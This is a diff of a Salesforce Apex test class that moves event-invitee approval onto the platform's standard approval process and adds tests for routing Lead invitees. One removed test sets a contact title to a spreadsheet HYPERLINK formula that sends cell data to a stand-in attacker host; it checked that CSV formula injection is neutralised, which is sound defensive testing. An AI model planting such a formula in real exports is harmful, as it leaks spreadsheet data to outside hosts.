@@ -1,20 +1,33 @@
 /**
- * End-to-end workflow tests: add → submit (owner snapshot + notifications)
- * → approve/reject (completion notification) → export (per event and across all
- * events) → rejected re-add.
- * Two AMs and two Account Owners exercise the multi-AM, multi-owner grouping.
+ * End-to-end workflow tests: add → submit (approver ladder + notifications) →
+ * approve/reject through the standard approval process → completion notification →
+ * rejected re-add.
+ *
+ * Two AMs and two Account Owners exercise the multi-AM, multi-owner grouping. The
+ * export tests that used to live here went with EventExportController — that path is
+ * two saved reports now, and a report is not something Apex can meaningfully assert on.
  */
 @IsTest
 private class EventWorkflowTest {
     private static User findUser(String alias) {
-        return [SELECT Id, Name FROM User WHERE Alias = :alias AND IsActive = TRUE LIMIT 1];
+        return [SELECT Id, Name, ManagerId FROM User WHERE Alias = :alias AND IsActive = TRUE LIMIT 1];
+    }
+
+    /** Approves or rejects through the platform, the way the Approvals list does. */
+    private static void decide(Id recordId, Boolean approve) {
+        Approval.ProcessWorkitemRequest req = new Approval.ProcessWorkitemRequest();
+        req.setWorkitemId(
+            [SELECT Id FROM ProcessInstanceWorkitem WHERE ProcessInstance.TargetObjectId = :recordId LIMIT 1].Id
+        );
+        req.setAction(approve ? 'Approve' : 'Reject');
+        Approval.process(req);
     }
 
     @TestSetup
     static void setup() {
         Profile std = [SELECT Id FROM Profile WHERE Name = 'Standard User' LIMIT 1];
         List<User> users = new List<User>();
-        for (String alias : new List<String>{ 'amalex', 'ammaria', 'ownsarah', 'ownmarc' }) {
+        for (String alias : new List<String>{ 'amalex', 'ammaria', 'ownsarah', 'ownmarc', 'mgrdana' }) {
             users.add(
                 new User(
                     Alias = alias,
@@ -31,6 +44,12 @@ private class EventWorkflowTest {
         }
         System.runAs(new User(Id = UserInfo.getUserId())) {
             insert users; // runAs guards against mixed-DML with the setup below
+            // Dana manages both AMs — ladder rule 3, and the only approver a
+            // self-owned lead can reach.
+            update new List<User>{
+                new User(Id = users[0].Id, ManagerId = users[4].Id),
+                new User(Id = users[1].Id, ManagerId = users[4].Id)
+            };
         }
 
         User sarah = users[2];
@@ -72,7 +91,7 @@ private class EventWorkflowTest {
     }
 
     @IsTest
-    static void fullWorkflow_submitApproveExport() {
+    static void fullWorkflow_submitApproveReject() {
         User alex = findUser('amalex');
         User maria = findUser('ammaria');
         User sarah = findUser('ownsarah');
@@ -81,7 +100,6 @@ private class EventWorkflowTest {
         Contact robert = [SELECT Id FROM Contact WHERE Email = 'robert@acme.test'];
         Contact james = [SELECT Id FROM Contact WHERE Email = 'james@nordbank.test'];
 
-        // Alex adds two Acme contacts; Maria adds the Nordbank contact.
         System.runAs(alex) {
             Integer added = InviteeSelectorController.addInvitees(evt.Id, new List<Id>{ emily.Id, robert.Id });
             System.assertEquals(2, added);
@@ -89,273 +107,298 @@ private class EventWorkflowTest {
             System.assertEquals(0, InviteeSelectorController.addInvitees(evt.Id, new List<Id>{ emily.Id }));
             InviteeSelectorController.SubmitResult sub = InviteeSelectorController.submitMyInvitees(evt.Id);
             System.assertEquals(2, sub.submitted);
-            System.assertEquals(1, sub.ownersNotified, 'Both Acme contacts → one distinct owner (Sarah)');
+            System.assertEquals(1, sub.approversNotified, 'Both Acme contacts → one distinct approver (Sarah)');
         }
         System.runAs(maria) {
             InviteeSelectorController.addInvitees(evt.Id, new List<Id>{ james.Id });
             InviteeSelectorController.SubmitResult sub = InviteeSelectorController.submitMyInvitees(evt.Id);
-            System.assertEquals(1, sub.submitted);
-            System.assertEquals(1, sub.ownersNotified, 'Nordbank → Marcus');
+            System.assertEquals(1, sub.approversNotified, 'Nordbank → Marcus');
         }
 
-        // Owner snapshot must point at the account owners.
-        for (Event_Invitee__c inv : [SELECT Account_Owner__c, Account__r.OwnerId, Status__c FROM Event_Invitee__c]) {
-            System.assertEquals('Pending Approval', inv.Status__c);
-            System.assertEquals(inv.Account__r.OwnerId, inv.Account_Owner__c);
+        // The approval process, not our Apex, owns the status from submission onwards.
+        for (Event_Invitee__c inv : [
+            SELECT Account_Owner__c, Approver__c, Account__r.OwnerId, Status__c, Submitted_At__c
+            FROM Event_Invitee__c
+        ]) {
+            System.assertEquals('Pending Approval', inv.Status__c, 'Initial submission action must set the status');
+            System.assertEquals(inv.Account__r.OwnerId, inv.Approver__c, 'Ladder rule 1: the Account Owner approves');
+            System.assertEquals(inv.Account__r.OwnerId, inv.Account_Owner__c, 'Audit snapshot still taken');
+            System.assertNotEquals(null, inv.Submitted_At__c);
         }
+        System.assertEquals(3, [SELECT COUNT() FROM ProcessInstance], 'One approval instance per invitee');
 
-        // Sarah sees only her two (Acme) rows — Maria's Nordbank row belongs to Marcus.
-        System.runAs(sarah) {
-            List<ApprovalConsoleController.PendingInvitee> mine = ApprovalConsoleController.getPendingForMe(evt.Id);
-            System.assertEquals(2, mine.size());
-
-            // Approve one, reject one → Alex has zero pending left → completion notification fires.
-            Test.startTest();
-            ApprovalConsoleController.DecisionResult r1 = ApprovalConsoleController.decide(
-                evt.Id,
-                new List<Id>{ mine[0].inviteeId },
-                true
-            );
-            System.assertEquals(1, r1.decided);
-            System.assertEquals(0, r1.amsNotified, 'Alex still has one pending row');
-
-            ApprovalConsoleController.DecisionResult r2 = ApprovalConsoleController.decide(
-                evt.Id,
-                new List<Id>{ mine[1].inviteeId },
-                false
-            );
-            System.assertEquals(1, r2.decided);
-            System.assertEquals(1, r2.amsNotified, 'Alex fully reviewed → notify him');
-            Test.stopTest();
-        }
-
-        // Export as Alex: 1 approved row; flips to Exported; re-export still returns it.
-        System.runAs(alex) {
-            EventExportController.ExportResult ex1 = EventExportController.exportApproved(evt.Id, null, null);
-            System.assertEquals(1, ex1.rowCount);
-            System.assert(ex1.csv.startsWith('Name,Title,Account,Email,Approved By,Decided At'));
-            System.assertEquals(1, [SELECT COUNT() FROM Event_Invitee__c WHERE Status__c = 'Exported']);
-
-            EventExportController.ExportResult ex2 = EventExportController.exportApproved(evt.Id, null, null);
-            System.assertEquals(1, ex2.rowCount, 'Re-export must return the full approved list');
-        }
-    }
-
-    @IsTest
-    static void exportAllApproved_spansEventsAndRespectsMineOnly() {
-        User alex = findUser('amalex');
-        User maria = findUser('ammaria');
-        User sarah = findUser('ownsarah');
-        User marcus = findUser('ownmarc');
-
-        Marketing_Event__c gala = [SELECT Id FROM Marketing_Event__c LIMIT 1];
-        Marketing_Event__c summit = new Marketing_Event__c(
-            Name = 'FinTech Summit, 2026', // the comma is deliberate — exercises CSV quoting
-            Event_Date__c = Date.today().addDays(90),
-            Location__c = 'Berlin',
-            Event_Type__c = 'Dinner / Gala'
-        );
-        insert summit;
-
-        Contact emily = [SELECT Id FROM Contact WHERE Email = 'emily@acme.test'];
-        Contact james = [SELECT Id FROM Contact WHERE Email = 'james@nordbank.test'];
-
-        // A Title any AM could set, and that Excel would execute on open.
-        update new Contact(Id = emily.Id, Title = '=HYPERLINK("http://evil.test?d="&A1,"Invoice")');
-
-        System.runAs(alex) {
-            InviteeSelectorController.addInvitees(gala.Id, new List<Id>{ emily.Id });
-            InviteeSelectorController.submitMyInvitees(gala.Id);
-        }
-        System.runAs(maria) {
-            InviteeSelectorController.addInvitees(summit.Id, new List<Id>{ james.Id });
-            InviteeSelectorController.submitMyInvitees(summit.Id);
-        }
-        Event_Invitee__c emilyRow = [SELECT Id FROM Event_Invitee__c WHERE Contact__c = :emily.Id];
-        Event_Invitee__c jamesRow = [SELECT Id FROM Event_Invitee__c WHERE Contact__c = :james.Id];
+        List<Event_Invitee__c> acmeRows = [
+            SELECT Id
+            FROM Event_Invitee__c
+            WHERE Contact__c IN (:emily.Id, :robert.Id)
+            ORDER BY Id
+        ];
 
         Test.startTest();
         System.runAs(sarah) {
-            ApprovalConsoleController.decide(gala.Id, new List<Id>{ emilyRow.Id }, true);
-        }
-        System.runAs(marcus) {
-            ApprovalConsoleController.decide(summit.Id, new List<Id>{ jamesRow.Id }, true);
+            decide(acmeRows[0].Id, true);
+            decide(acmeRows[1].Id, false);
         }
         Test.stopTest();
 
-        System.runAs(alex) {
-            List<EventExportController.ApprovedSummary> all = EventExportController.getApprovedSummary(
-                false,
-                null,
-                null
-            );
-            System.assertEquals(2, all.size(), 'Both events carry approved rows');
-            for (EventExportController.ApprovedSummary s : all) {
-                System.assertEquals(1, s.approvedCount);
-                System.assertEquals(0, s.exportedCount);
-                System.assertEquals(1, s.totalCount);
-            }
-            System.assertEquals(
-                1,
-                EventExportController.getApprovedSummary(true, null, null).size(),
-                'mineOnly must drop the row Maria added'
-            );
-
-            EventExportController.ExportResult ex = EventExportController.exportAllApproved(false, null, null);
-            System.assertEquals(2, ex.rowCount);
-            System.assertEquals(2, ex.eventCount);
-            System.assertEquals(false, ex.truncated);
-            System.assert(
-                ex.csv.startsWith('Event,Event Date,Name,Title,Account,Email,Approved By,Decided At'),
-                'Cross-event file needs the event columns'
-            );
-            System.assert(ex.csv.contains('\r\n'), 'CRLF line endings — desktop Excel chokes on bare LF');
-            System.assert(ex.csv.contains('"FinTech Summit, 2026"'), 'A value with a comma must be quoted');
-            System.assert(
-                ex.csv.contains('"\'=HYPERLINK('),
-                'A formula-shaped Title must reach the file neutralised: ' + ex.csv
-            );
-            System.assert(!ex.csv.contains(',=HYPERLINK'), 'A bare formula must never start a cell');
-            System.assertEquals(
-                2,
-                [SELECT COUNT() FROM Event_Invitee__c WHERE Status__c = 'Exported'],
-                'Downloading everything marks everything Exported'
-            );
-
-            System.assertEquals(
-                2,
-                EventExportController.exportAllApproved(false, null, null).rowCount,
-                'Re-download must return the full approved list, not only new rows'
-            );
-
-            EventExportController.ExportResult justMine = EventExportController.exportAllApproved(true, null, null);
-            System.assertEquals(1, justMine.rowCount);
-            System.assertEquals(1, justMine.eventCount);
-
-            EventExportController.rowLimit = 1;
-            EventExportController.ExportResult capped = EventExportController.exportAllApproved(false, null, null);
-            System.assertEquals(1, capped.rowCount);
-            System.assertEquals(true, capped.truncated, 'Row cap must be reported, not silently applied');
+        Map<Id, Event_Invitee__c> after = new Map<Id, Event_Invitee__c>(
+            [SELECT Id, Status__c, Decided_At__c FROM Event_Invitee__c WHERE Id IN :acmeRows]
+        );
+        System.assertEquals('Approved', after.get(acmeRows[0].Id).Status__c);
+        System.assertEquals('Rejected', after.get(acmeRows[1].Id).Status__c);
+        for (Event_Invitee__c inv : after.values()) {
+            System.assertNotEquals(null, inv.Decided_At__c, 'Stamp_Decided_At runs on both outcomes');
         }
+
+        Marketing_Event__c counts = [
+            SELECT Approved_Count__c, Rejected_Count__c, Pending_Count__c
+            FROM Marketing_Event__c
+            WHERE Id = :evt.Id
+        ];
+        System.assertEquals(1, counts.Approved_Count__c);
+        System.assertEquals(1, counts.Rejected_Count__c);
+        System.assertEquals(1, counts.Pending_Count__c, 'Maria\'s Nordbank row is untouched');
     }
 
     /**
-     * The decision-date range is picked as calendar dates in the user's timezone but
-     * compared against Decided_At__c, which is GMT. Taipei (UTC+8, no DST) is used so
-     * the two readings of the same instant land on *different* calendar days: an
-     * implementation that filtered on the raw GMT date would fail both assertions.
+     * The case the whole Lead model exists for, and the one that would look identical
+     * to success if it were wrong: an AM adds a professor they own as a Lead. Rule 2's
+     * exclusion must send it to their *manager*, because routing it to the Lead Owner
+     * would mean the submitter approving their own guest.
      */
     @IsTest
-    static void dateRangeBoundariesFollowUserTimezone() {
+    static void leadInviteeRoutesToManagerNotToItsOwner() {
         User alex = findUser('amalex');
-        User sarah = findUser('ownsarah');
-        System.runAs(new User(Id = UserInfo.getUserId())) {
-            update new User(Id = alex.Id, TimeZoneSidKey = 'Asia/Taipei'); // runAs: setup vs non-setup DML
-        }
-
+        User dana = findUser('mgrdana');
         Marketing_Event__c evt = [SELECT Id FROM Marketing_Event__c LIMIT 1];
-        Contact emily = [SELECT Id FROM Contact WHERE Email = 'emily@acme.test'];
 
+        Lead prof;
         System.runAs(alex) {
-            InviteeSelectorController.addInvitees(evt.Id, new List<Id>{ emily.Id });
-            InviteeSelectorController.submitMyInvitees(evt.Id);
-        }
-        Event_Invitee__c row = [SELECT Id FROM Event_Invitee__c WHERE Contact__c = :emily.Id];
-        System.runAs(sarah) {
-            ApprovalConsoleController.decide(evt.Id, new List<Id>{ row.Id }, true);
-        }
+            prof = new Lead(
+                FirstName = 'Hélène',
+                LastName = 'Dubois',
+                Company = 'Université de Genève',
+                Title = 'Professor of Cryptography',
+                Email = 'h.dubois@unige.test',
+                OwnerId = alex.Id
+            );
+            insert prof;
 
-        // 2026-06-30 20:00 GMT is 2026-07-01 04:00 in Taipei — 30 June by GMT, 1 July to Alex.
-        update new Event_Invitee__c(Id = row.Id, Decided_At__c = Datetime.newInstanceGmt(2026, 6, 30, 20, 0, 0));
-
-        Date jun30 = Date.newInstance(2026, 6, 30);
-        Date jul01 = Date.newInstance(2026, 7, 1);
-
-        System.runAs(alex) {
-            // 30 June in Taipei ends at 2026-06-30 16:00 GMT — the row is after that.
+            InviteeSelectorController.SelectableResult sel = InviteeSelectorController.getSelectableLeads(evt.Id);
+            System.assertEquals(1, sel.contacts.size(), 'Alex owns exactly one unconverted lead');
+            System.assertEquals(prof.Id, sel.contacts[0].leadId);
             System.assertEquals(
-                0,
-                EventExportController.getApprovedSummary(false, jun30, jun30).size(),
-                'Approved on 1 July local time — a 30 June range must not see it'
+                'Université de Genève',
+                sel.contacts[0].accountName,
+                'Company text stands in for Account'
             );
-            Boolean threw = false;
-            try {
-                EventExportController.exportAllApproved(false, jun30, jun30);
-            } catch (AuraHandledException e) {
-                threw = true;
-            }
-            System.assert(threw, 'Out-of-range export must fail loudly, not hand over an empty file');
 
-            // 1 July in Taipei = 2026-06-30 16:00 → 2026-07-01 16:00 GMT, end-inclusive.
-            List<EventExportController.ApprovedSummary> hits = EventExportController.getApprovedSummary(
-                false,
-                jul01,
-                jul01
-            );
-            System.assertEquals(1, hits.size());
-            System.assertEquals(1, hits[0].approvedCount);
-
-            EventExportController.ExportResult ex = EventExportController.exportAllApproved(false, jul01, jul01);
-            System.assertEquals(1, ex.rowCount);
-            System.assert(
-                ex.windowLabel.contains('2026-06-30 16:00'),
-                'Reported GMT window must start at Taipei midnight, not GMT midnight: ' + ex.windowLabel
-            );
-            System.assert(ex.windowLabel.contains('Asia/Taipei'), 'Window names the timezone it was read in');
-            System.assert(ex.fileName.contains('2026-07-01'), 'Filename carries the requested range');
-
-            // An open-ended range is still allowed on either side.
-            System.assertEquals(1, EventExportController.exportAllApproved(false, jul01, null).rowCount);
-            System.assertEquals(1, EventExportController.exportAllApproved(false, null, jul01).rowCount);
+            System.assertEquals(1, InviteeSelectorController.addLeadInvitees(evt.Id, new List<Id>{ prof.Id }));
+            InviteeSelectorController.SubmitResult sub = InviteeSelectorController.submitMyInvitees(evt.Id);
+            System.assertEquals(1, sub.submitted);
         }
-    }
 
-    /**
-     * CSV formula injection: exported values are AM-editable (Contact Title, Account
-     * name, event name) or arrive via the .csv import, so a cell must never reach
-     * Excel in a state it will evaluate.
-     */
-    @IsTest
-    static void csvCellNeutralisesFormulaTriggers() {
-        // Named triggerChar, not trigger: the latter is an Apex reserved word that
-        // the compiler happens to accept here but Apex parsers (prettier, PMD)
-        // reject, which silently drops this file out of the tooling.
-        for (String triggerChar : new List<String>{ '=', '+', '-', '@' }) {
-            System.assertEquals(
-                '"\'' + triggerChar + '1+1"',
-                EventExportController.csvCell(triggerChar + '1+1'),
-                'A cell opening with ' + triggerChar + ' must be quoted and prefixed with an apostrophe'
-            );
+        Event_Invitee__c inv = [
+            SELECT
+                Status__c,
+                Approver__c,
+                Account__c,
+                Account_Owner__c,
+                Invitee_Name__c,
+                Invitee_Org__c,
+                Invitee_Type__c
+            FROM Event_Invitee__c
+            WHERE Lead__c = :prof.Id
+        ];
+        System.assertEquals(dana.Id, inv.Approver__c, 'A self-owned lead must never route back to its submitter');
+        System.assertNotEquals(alex.Id, inv.Approver__c);
+        System.assertEquals(null, inv.Account__c, 'A lead invitee has no customer Account — that is the point');
+        System.assertEquals(null, inv.Account_Owner__c);
+        System.assertEquals('Pending Approval', inv.Status__c);
+
+        // The formula fields are what let one report cover both kinds of invitee.
+        System.assertEquals('Hélène Dubois', inv.Invitee_Name__c);
+        System.assertEquals('Université de Genève', inv.Invitee_Org__c);
+        System.assertEquals('Lead', inv.Invitee_Type__c);
+
+        Test.startTest();
+        System.runAs(dana) {
+            decide([SELECT Id FROM Event_Invitee__c WHERE Lead__c = :prof.Id].Id, true);
         }
-        // Tab and CR are triggers too — Excel skips them before parsing what follows.
-        System.assert(
-            EventExportController.csvCell('\t=1+1').startsWith('"\'\t='),
-            'A leading tab must not smuggle a formula past the guard'
+        Test.stopTest();
+
+        System.assertEquals(
+            'Approved',
+            [SELECT Status__c FROM Event_Invitee__c WHERE Lead__c = :prof.Id].Status__c,
+            'The manager can decide it — it is a real work item, not an orphan'
         );
 
-        // Ordinary values are untouched; existing quoting behaviour is unchanged.
-        System.assertEquals('Emily Carter', EventExportController.csvCell('Emily Carter'));
-        System.assertEquals('"Acme, Inc"', EventExportController.csvCell('Acme, Inc'));
-        System.assertEquals('"He said ""hi"""', EventExportController.csvCell('He said "hi"'));
-        System.assertEquals('', EventExportController.csvCell(null));
-        System.assertEquals('', EventExportController.csvCell(''));
-        // Only the first character matters — a hyphen mid-value is not a trigger.
-        System.assertEquals('Vice-President', EventExportController.csvCell('Vice-President'));
+        // No Account was invented anywhere along the way.
+        System.assertEquals(
+            0,
+            [SELECT COUNT() FROM Account WHERE Name = 'Université de Genève'],
+            'Account means transacting customer — a university must never become one'
+        );
     }
 
+    /** A lead owned by someone else routes to that owner: rule 2 without the exclusion. */
     @IsTest
-    static void exportAllApproved_withNothingApprovedThrows() {
+    static void leadOwnedByAnotherUserRoutesToThatOwner() {
         User alex = findUser('amalex');
+        User marcus = findUser('ownmarc');
+        Marketing_Event__c evt = [SELECT Id FROM Marketing_Event__c LIMIT 1];
+
+        Lead speaker = new Lead(
+            FirstName = 'Tomas',
+            LastName = 'Lindqvist',
+            Company = 'KTH Royal Institute',
+            Email = 't.lindqvist@kth.test',
+            OwnerId = marcus.Id
+        );
+        insert speaker;
+
         System.runAs(alex) {
-            System.assertEquals(0, EventExportController.getApprovedSummary(false, null, null).size());
+            InviteeSelectorController.addLeadInvitees(evt.Id, new List<Id>{ speaker.Id });
+            InviteeSelectorController.submitMyInvitees(evt.Id);
+        }
+        System.assertEquals(
+            marcus.Id,
+            [SELECT Approver__c FROM Event_Invitee__c WHERE Lead__c = :speaker.Id].Approver__c,
+            'Rule 2: the lead owner holds the relationship, so they sign it off'
+        );
+    }
+
+    /**
+     * The orphan-row defect, made unreachable. A submitter with no manager adding a
+     * lead they own has nobody left on the ladder; the submit must fail with a named
+     * error and leave everything in Draft, rather than creating a pending row that no
+     * approver can ever see.
+     */
+    @IsTest
+    static void unroutableSubmitIsRefusedAndNothingMoves() {
+        User maria = findUser('ammaria');
+        System.runAs(new User(Id = UserInfo.getUserId())) {
+            update new User(Id = maria.Id, ManagerId = null);
+        }
+        Marketing_Event__c evt = [SELECT Id FROM Marketing_Event__c LIMIT 1];
+
+        System.runAs(maria) {
+            Lead l = new Lead(
+                FirstName = 'Ana',
+                LastName = 'Ferreira',
+                Company = 'Instituto Superior Técnico',
+                Email = 'a.ferreira@ist.test',
+                OwnerId = maria.Id
+            );
+            insert l;
+            InviteeSelectorController.addLeadInvitees(evt.Id, new List<Id>{ l.Id });
+
             Boolean threw = false;
             try {
-                EventExportController.exportAllApproved(false, null, null);
+                InviteeSelectorController.submitMyInvitees(evt.Id);
             } catch (AuraHandledException e) {
                 threw = true;
             }
-            System.assert(threw, 'Nothing approved → explicit error, not an empty file');
+            System.assert(threw, 'No approver on the ladder → the submit must fail loudly');
         }
+
+        System.assertEquals(
+            0,
+            [SELECT COUNT() FROM Event_Invitee__c WHERE Status__c = 'Pending Approval'],
+            'A refused submit must move nothing — no half-submitted batch'
+        );
+        System.assertEquals(1, [SELECT COUNT() FROM Event_Invitee__c WHERE Status__c = 'Draft']);
+        System.assertEquals(0, [SELECT COUNT() FROM ProcessInstance], 'Nothing entered the approval process');
+    }
+
+    /** An invitee must point at exactly one of Contact / Lead — the XOR validation rule. */
+    @IsTest
+    static void inviteeCannotBeBothOrNeither() {
+        Marketing_Event__c evt = [SELECT Id FROM Marketing_Event__c LIMIT 1];
+        Contact emily = [SELECT Id FROM Contact WHERE Email = 'emily@acme.test'];
+        Lead l = new Lead(LastName = 'Nobody', Company = 'Nowhere University', Email = 'n@nowhere.test');
+        insert l;
+
+        Boolean neitherThrew = false;
+        try {
+            insert new Event_Invitee__c(Marketing_Event__c = evt.Id, Status__c = 'Draft', Unique_Key__c = 'k-neither');
+        } catch (DmlException e) {
+            neitherThrew = true;
+        }
+        System.assert(neitherThrew, 'An invitee pointing at nobody must be refused');
+
+        Boolean bothThrew = false;
+        try {
+            insert new Event_Invitee__c(
+                Marketing_Event__c = evt.Id,
+                Contact__c = emily.Id,
+                Lead__c = l.Id,
+                Status__c = 'Draft',
+                Unique_Key__c = 'k-both'
+            );
+        } catch (DmlException e) {
+            bothThrew = true;
+        }
+        System.assert(bothThrew, 'Two identities on one row would silently prefer the Contact');
+    }
+
+    @IsTest
+    static void completionNotificationFiresOnlyWhenTheBatchIsDone() {
+        User alex = findUser('amalex');
+        User sarah = findUser('ownsarah');
+        Marketing_Event__c evt = [SELECT Id FROM Marketing_Event__c LIMIT 1];
+        Contact emily = [SELECT Id FROM Contact WHERE Email = 'emily@acme.test'];
+        Contact robert = [SELECT Id FROM Contact WHERE Email = 'robert@acme.test'];
+
+        System.runAs(alex) {
+            InviteeSelectorController.addInvitees(evt.Id, new List<Id>{ emily.Id, robert.Id });
+            InviteeSelectorController.submitMyInvitees(evt.Id);
+        }
+        List<Event_Invitee__c> rows = [SELECT Id FROM Event_Invitee__c ORDER BY Id];
+
+        Test.startTest();
+        EventNotificationService.emailsSent = 0;
+        // One of two decided: the AM still has something pending, so stay quiet.
+        System.runAs(sarah) {
+            decide(rows[0].Id, true);
+        }
+        EventNotificationService.notifyCompletions(new List<Id>{ rows[0].Id });
+        System.assertEquals(0, EventNotificationService.emailsSent, 'One row left pending — no completion email yet');
+
+        System.runAs(sarah) {
+            decide(rows[1].Id, true);
+        }
+        EventNotificationService.notifyCompletions(new List<Id>{ rows[1].Id });
+        System.assertEquals(1, EventNotificationService.emailsSent, 'Zero pending left → notify the AM once');
+        Test.stopTest();
+    }
+
+    /** Mass approval arrives as one invocable call with every id — one email, not forty. */
+    @IsTest
+    static void completionNotificationAggregatesABulkDecision() {
+        User alex = findUser('amalex');
+        Marketing_Event__c evt = [SELECT Id FROM Marketing_Event__c LIMIT 1];
+        List<Contact> cs = [SELECT Id FROM Contact WHERE Email LIKE '%acme.test'];
+
+        System.runAs(alex) {
+            InviteeSelectorController.addInvitees(evt.Id, new List<Id>(new Map<Id, Contact>(cs).keySet()));
+            InviteeSelectorController.submitMyInvitees(evt.Id);
+        }
+        Test.startTest();
+        // Decided directly rather than through the approval process: this test is about
+        // the invocable's aggregation, and driving 2+ work items adds nothing to that.
+        List<Id> ids = new List<Id>();
+        List<Event_Invitee__c> all = [SELECT Id, Status__c FROM Event_Invitee__c];
+        for (Event_Invitee__c inv : all) {
+            inv.Status__c = 'Approved';
+            ids.add(inv.Id);
+        }
+        update all;
+
+        EventNotificationService.emailsSent = 0;
+        EventNotificationService.notifyCompletions(ids);
+        System.assertEquals(1, EventNotificationService.emailsSent, 'Two rows, one AM, one event → exactly one email');
+        Test.stopTest();
     }
 
     @IsTest
@@ -370,16 +413,19 @@ private class EventWorkflowTest {
             InviteeSelectorController.submitMyInvitees(evt.Id);
         }
         Event_Invitee__c inv = [SELECT Id FROM Event_Invitee__c WHERE Contact__c = :emily.Id];
+
+        Test.startTest();
         System.runAs(sarah) {
-            ApprovalConsoleController.decide(evt.Id, new List<Id>{ inv.Id }, false);
+            decide(inv.Id, false);
         }
+        Test.stopTest();
 
         System.runAs(alex) {
             Integer added = InviteeSelectorController.addInvitees(evt.Id, new List<Id>{ emily.Id });
             System.assertEquals(1, added, 'Rejected row should reset, not error');
         }
         inv = [
-            SELECT Status__c, Submitted_At__c, Decided_At__c, Account_Owner__c
+            SELECT Status__c, Submitted_At__c, Decided_At__c, Account_Owner__c, Approver__c
             FROM Event_Invitee__c
             WHERE Id = :inv.Id
         ];
@@ -387,6 +433,11 @@ private class EventWorkflowTest {
         System.assertEquals(null, inv.Submitted_At__c);
         System.assertEquals(null, inv.Decided_At__c);
         System.assertEquals(null, inv.Account_Owner__c);
+        System.assertEquals(
+            null,
+            inv.Approver__c,
+            'A stale approver would let the next submit skip the ladder and reuse whoever decided last time'
+        );
         System.assertEquals(
             1,
             [SELECT COUNT() FROM Event_Invitee__c WHERE Contact__c = :emily.Id],
@@ -421,31 +472,26 @@ private class EventWorkflowTest {
             System.assertEquals(1, all.size());
             System.assertEquals(true, all[0].mine);
             System.assertEquals('Draft', all[0].status);
+            System.assertEquals('Contact', all[0].inviteeType);
+            System.assertEquals('Alex Own Account', all[0].accountName, 'Read through Invitee_Org__c, not Account__r');
         }
     }
 
+    /** A converted lead is not selectable — its Contact is the thing to invite. */
     @IsTest
-    static void decideRejectsForeignRows() {
+    static void convertedAndInvitedLeadsAreHidden() {
         User alex = findUser('amalex');
-        User marcus = findUser('ownmarc');
         Marketing_Event__c evt = [SELECT Id FROM Marketing_Event__c LIMIT 1];
-        Contact emily = [SELECT Id FROM Contact WHERE Email = 'emily@acme.test'];
+
+        Lead keep = new Lead(LastName = 'Keeper', Company = 'ETH Zürich', Email = 'k@eth.test', OwnerId = alex.Id);
+        Lead invite = new Lead(LastName = 'Invited', Company = 'ETH Zürich', Email = 'i@eth.test', OwnerId = alex.Id);
+        insert new List<Lead>{ keep, invite };
 
         System.runAs(alex) {
-            InviteeSelectorController.addInvitees(evt.Id, new List<Id>{ emily.Id });
-            InviteeSelectorController.submitMyInvitees(evt.Id);
-        }
-        Event_Invitee__c inv = [SELECT Id FROM Event_Invitee__c WHERE Contact__c = :emily.Id];
-
-        // Marcus is not the owner of Acme — deciding Sarah's row must fail.
-        System.runAs(marcus) {
-            Boolean threw = false;
-            try {
-                ApprovalConsoleController.decide(evt.Id, new List<Id>{ inv.Id }, true);
-            } catch (AuraHandledException e) {
-                threw = true;
-            }
-            System.assert(threw, 'Owners can only decide their own pending rows');
+            InviteeSelectorController.addLeadInvitees(evt.Id, new List<Id>{ invite.Id });
+            InviteeSelectorController.SelectableResult sel = InviteeSelectorController.getSelectableLeads(evt.Id);
+            System.assertEquals(1, sel.contacts.size(), 'The invited lead must drop out of the list');
+            System.assertEquals(keep.Id, sel.contacts[0].leadId);
         }
     }
 }
